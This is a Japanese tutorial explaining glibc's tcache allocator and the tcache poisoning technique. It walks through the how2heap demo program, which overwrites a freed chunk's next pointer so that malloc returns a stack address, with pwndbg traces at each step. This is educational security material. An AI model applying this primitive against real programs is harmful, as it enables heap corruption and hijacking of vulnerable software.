
## tcache makes heap exploitation easy again

### 0x01 Tcache overview

tcache には、tcache_entry と tcache_perthread_struct という2つの構造体が新たに追加されています。

```C
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```



このうち重要な関数が2つあります。`tcache_get()` と `tcache_put()` です。

```C
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

static void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}

```

この2つの関数は、関数 [_int_free](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173) と [__libc_malloc](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051) の冒頭で呼び出されます。`tcache_put` は、要求された確保サイズが `0x408` 以下で、かつ指定サイズの tcache bin がいっぱいでないときに呼び出されます。1つの tcache bin に入るブロックの最大数 `mp_.tcache_count` は `7` です。

```c
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
#endif
```



もう一度 `tcache_get()` のソースコードを見ておきましょう。

```C
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```
`tcache_get` では **tc_idx** しかチェックされていません。さらに、tcache は fastbin に似た独立したリストと見なせますが、そのチェックは fastbin ほど複雑ではなく、チェックされるのは ` tcache->entries[tc_idx] = e->next;` だけです。

### 0x02 Tcache Usage



- メモリの解放:

  free 関数の最初の処理部分で、まず解放するブロックがページアラインされているか、および前後のヒープブロックの解放状況がチェックされ、その後で優先的に tcache 構造に入れられることが分かります。
  

  ```c
  
  _int_free (mstate av, mchunkptr p, int have_lock)
  {
    INTERNAL_SIZE_T size;        /* its size */
    mfastbinptr *fb;             /* associated fastbin */
    mchunkptr nextchunk;         /* next contiguous chunk */
    INTERNAL_SIZE_T nextsize;    /* its size */
    int nextinuse;               /* true if nextchunk is used */
    INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
    mchunkptr bck;               /* misc temp for linking */
    mchunkptr fwd;               /* misc temp for linking */
  
    size = chunksize (p);
  
    /* Little security check which won't hurt performance: the
       allocator never wrapps around at the end of the address space.
       Therefore we can exclude some size values which might appear
       here by accident or by "design" from some intruder.  */
    if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
        || __builtin_expect (misaligned_chunk (p), 0))
      malloc_printerr ("free(): invalid pointer");
    /* We know that each chunk is at least MINSIZE bytes in size or a
       multiple of MALLOC_ALIGNMENT.  */
    if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
      malloc_printerr ("free(): invalid size");
  
    check_inuse_chunk(av, p);
  
  #if USE_TCACHE
    {
      size_t tc_idx = csize2tidx (size);
  
      if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
        {
          tcache_put (p, tc_idx);
          return;
        }
    }
  #endif
  
  ......
  }
  ```



-  メモリの確保:

メモリを確保する malloc 関数の中には、メモリブロックを tcache に移す箇所が複数あります。

(1) まず、確保するメモリブロックが fastbin のサイズに合致し、fastbin 内に利用可能な空きブロックが見つかったとき、その fastbin のリスト上のほかのメモリブロックを tcache に入れます。

(2) 次に、確保するメモリブロックが smallbin のサイズに合致し、smallbin 内に利用可能な空きブロックが見つかったとき、その smallbin のリスト上のほかのメモリブロックを tcache に入れます。

(3) unsorted bin のリスト上をループ処理している最中に、サイズが適切なものが見つかっても、すぐには返さず、まず tcache に入れてから処理を続けます。

コードが長いので全部は貼りません。fastbin に合致する場合の部分だけ貼ります。

```c
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      if (victim != NULL)
	{
	  if (SINGLE_THREAD_P)
	    *fb = victim->fd;
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0))
		      malloc_printerr ("malloc(): memory corruption (fast)");
	      check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
        {
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks.  */
          while (tcache->counts[tc_idx] < mp_.tcache_count
            && (tc_victim = *fb) != NULL)
            {
              if (SINGLE_THREAD_P)
               *fb = tc_victim->fd;
              else
              {
                REMOVE_FB (fb, pp, tc_victim);
                if (__glibc_unlikely (tc_victim == NULL))
                  break;
              }
              tcache_put (tc_victim, tc_idx);
            }
        }
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p;
	    }
	}
    }
```



 

- tcache からの取り出し: メモリ確保の冒頭で、まず確保するサイズのブロックが tcache に存在するかを判断し、存在すれば tcache から直接取り外し、そうでなければ _int_malloc で確保します。

- unsorted bin のメモリブロックをループ処理する際、unsorted bin に入れるブロックの最大数に達したら、すぐに戻ります。デフォルトは 0 で、つまり上限はありません。

  ```c
  #if USE_TCACHE
        /* If we've processed as many chunks as we're allowed while
  	 filling the cache, return one of the cached ones.  */
        ++tcache_unsorted_count;
        if (return_cached
          && mp_.tcache_unsorted_limit > 0
          && tcache_unsorted_count > mp_.tcache_unsorted_limit)
        {
          return tcache_get (tc_idx);
        }
  #endif
  ```

- unsorted bin のメモリブロックをループ処理した後、それ以前に tcache にブロックを入れていた場合は、1つ取り出して返します。

  ```c
  #if USE_TCACHE
        /* If all the small chunks we found ended up cached, return one now.  */
        if (return_cached)
        {
          return tcache_get (tc_idx);
        }
  #endif
  ```



### 0x03 Pwn Tcache

#### tcache poisoning

tcache 内の next を上書きすることで、チャンク構造を何も偽造せずに、任意のアドレスへ malloc できます。

how2heap の [tcache_poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_poisoning.c) を例にします。

ソースコードを見てみましょう。

```C
glibc_2.26 [master●] bat tcache_poisoning.c
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: tcache_poisoning.c
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ #include <stdint.h>
   4   │ 
   5   │ int main()
   6   │ {
   7   │         fprintf(stderr, "This file demonstrates a simple tcache poisoning attack
       │  by tricking malloc into\n"
   8   │                "returning a pointer to an arbitrary location (in this case, the 
       │ stack).\n"
   9   │                "The attack is very similar to fastbin corruption attack.\n\n");
  10   │ 
  11   │         size_t stack_var;
  12   │         fprintf(stderr, "The address we want malloc() to return is %p.\n", (char
       │  *)&stack_var);
  13   │ 
  14   │         fprintf(stderr, "Allocating 1 buffer.\n");
  15   │         intptr_t *a = malloc(128);
  16   │         fprintf(stderr, "malloc(128): %p\n", a);
  17   │         fprintf(stderr, "Freeing the buffer...\n");
  18   │         free(a);
  19   │ 
  20   │         fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
  21   │         fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of t
       │ he data at %p\n"
  22   │                 "to point to the location to control (%p).\n", sizeof(intptr_t),
       │  a, &stack_var);
  23   │         a[0] = (intptr_t)&stack_var;
  24   │ 
  25   │         fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
  26   │         fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
  27   │ 
  28   │         intptr_t *b = malloc(128);
  29   │         fprintf(stderr, "2st malloc(128): %p\n", b);
  30   │         fprintf(stderr, "We got the control\n");
  31   │ 
  32   │         return 0;
  33   │ }
───────┴─────────────────────────────────────────────────────────────────────────────────
```

実行結果は次のとおりです。
```bash
glibc_2.26 [master●] ./tcache_poisoning 
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7fff0d28a0c8.
Allocating 1 buffer.
malloc(128): 0x55f666ee1260
Freeing the buffer...
Now the tcache list has [ 0x55f666ee1260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55f666ee1260
to point to the location to control (0x7fff0d28a0c8).
1st malloc(128): 0x55f666ee1260
Now the tcache list has [ 0x7fff0d28a0c8 ].
2st malloc(128): 0x7fff0d28a0c8
We got the control
```
解析すると、プログラムはまずサイズ 128 のチャンクを確保し、それを free します。128 は tcache の範囲内なので、free 後このチャンクは tcache に入れられます。デバッグは次のとおりです。
```asm
pwndbg> 
0x0000555555554815	18		free(a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
......
 RDI  0x555555756260 ?— 0x0
......
 RIP  0x555555554815 (main+187) ?— call   0x555555554600
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
......
 ? 0x555555554815 <main+187>    call   free@plt <0x555555554600>
        ptr: 0x555555756260 ?— 0x0
......
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
......
 ? 18 	free(a);
......
────────────────────────────────────────[ STACK ]────────────────────────────────────────
......
pwndbg> ni
20		fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7
 RDX  0x0
 RDI  0x1
 RSI  0x555555756010 ?— 0x100000000000000
 R8   0x0
 R9   0x7fffffffb78c ?— 0x1c00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x55555555481a (main+192) ?— mov    rax, qword ptr [rip + 0x20083f]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x555555554802 <main+168>    lea    rdi, [rip + 0x2bd]
   0x555555554809 <main+175>    call   fwrite@plt <0x555555554630>
 
   0x55555555480e <main+180>    mov    rax, qword ptr [rbp - 8]
   0x555555554812 <main+184>    mov    rdi, rax
   0x555555554815 <main+187>    call   free@plt <0x555555554600>
 
 ? 0x55555555481a <main+192>    mov    rax, qword ptr [rip + 0x20083f] <0x555555755060>
   0x555555554821 <main+199>    mov    rdx, qword ptr [rbp - 8]
   0x555555554825 <main+203>    lea    rsi, [rip + 0x2b4]
   0x55555555482c <main+210>    mov    rdi, rax
   0x55555555482f <main+213>    mov    eax, 0
   0x555555554834 <main+218>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   15 	intptr_t *a = malloc(128);
   16 	fprintf(stderr, "malloc(128): %p\n", a);
   17 	fprintf(stderr, "Freeing the buffer...\n");
   18 	free(a);
   19 
 ? 20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260
pwndbg> heapbase
heapbase : 0x555555756000
pwndbg> p *(struct tcache_perthread_struct*)0x555555756010
$3 = {
  counts = "\000\000\000\000\000\000\000\001", '\000' <repeats 55 times>,
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x555555756260, 0x0 <repeats 56 times>}
}
```
このとき、8番目の tcache リストにすでにチャンクが1つあることが分かります。`tcache_perthread_struct` 構造体からも同じ結論が得られます。

次に tcache の next を書き換えます。
```asm
pwndbg> 
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x555555756260
to point to the location to control (0x7fffffffdfa8).
23		a[0] = (intptr_t)&stack_var;
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x85
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x8500000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x555555554867 (main+269) ?— lea    rdx, [rbp - 0x18]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
 ? 0x555555554867 <main+269>    lea    rdx, [rbp - 0x18] <0x7ffff7dd48b0>
   0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
   0x55555555486f <main+277>    mov    qword ptr [rax], rdx
   0x555555554872 <main+280>    mov    edi, 0x80
   0x555555554877 <main+285>    call   malloc@plt <0x555555554620>
 
   0x55555555487c <main+290>    mov    rdx, rax
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   18 	free(a);
   19 
   20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
 ? 23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260
pwndbg> n
25		fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RBX  0x0
 RCX  0x0
 RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x8500000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x555555554872 (main+280) ?— mov    edi, 0x80
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x555555554867 <main+269>    lea    rdx, [rbp - 0x18]
   0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
   0x55555555486f <main+277>    mov    qword ptr [rax], rdx
 ? 0x555555554872 <main+280>    mov    edi, 0x80
   0x555555554877 <main+285>    call   malloc@plt <0x555555554620>
 
   0x55555555487c <main+290>    mov    rdx, rax
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
 ? 25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│ rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260 --> 0x7fffffffdfa8 --> 0x555555554650
```
このとき、8番目の tcache リストの next はすでにスタック上のアドレスに書き換えられています。あとは fastbin attack と同様に、`malloc(128)` を2回行うだけでスタック上の領域を制御できます。

1回目の malloc
```asm
pwndbg> n
1st malloc(128): 0x555555756260
26		fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x20
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x6c6c616d20747331 ('1st mall')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x2000000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x55555555489a (main+320) ?— mov    rax, qword ptr [rip + 0x2007bf]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
 
 ? 0x55555555489a <main+320>    mov    rax, qword ptr [rip + 0x2007bf] <0x555555755060>
   0x5555555548a1 <main+327>    lea    rdx, [rbp - 0x18]
   0x5555555548a5 <main+331>    lea    rsi, [rip + 0x234]
   0x5555555548ac <main+338>    mov    rdi, rax
   0x5555555548af <main+341>    mov    eax, 0
   0x5555555548b4 <main+346>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
 ? 26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
   31 
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffdfa8 --> 0x555555554650
```

2回目の malloc で、スタック上のアドレスを malloc できます。
```asm
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffdfa8 --> 0x555555554650
pwndbg> ni
0x00005555555548c3	28		intptr_t *b = malloc(128);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RBX  0x0
 RCX  0x555555756010 ?— 0xff00000000000000
 RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RDI  0x555555554650 (_start) ?— xor    ebp, ebp
 RSI  0x555555756048 ?— 0x0
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x2c00000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x5555555548c3 (main+361) ?— mov    qword ptr [rbp - 0x10], rax
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555548ac <main+338>    mov    rdi, rax
   0x5555555548af <main+341>    mov    eax, 0
   0x5555555548b4 <main+346>    call   fprintf@plt <0x555555554610>
 
   0x5555555548b9 <main+351>    mov    edi, 0x80
   0x5555555548be <main+356>    call   malloc@plt <0x555555554620>
 
 ? 0x5555555548c3 <main+361>    mov    qword ptr [rbp - 0x10], rax
   0x5555555548c7 <main+365>    mov    rax, qword ptr [rip + 0x200792] <0x555555755060>
   0x5555555548ce <main+372>    mov    rdx, qword ptr [rbp - 0x10]
   0x5555555548d2 <main+376>    lea    rsi, [rip + 0x2b4]
   0x5555555548d9 <main+383>    mov    rdi, rax
   0x5555555548dc <main+386>    mov    eax, 0
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
 ? 28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
   31 
   32 	return 0;
   33 }
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp      0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│ rax rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│          0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
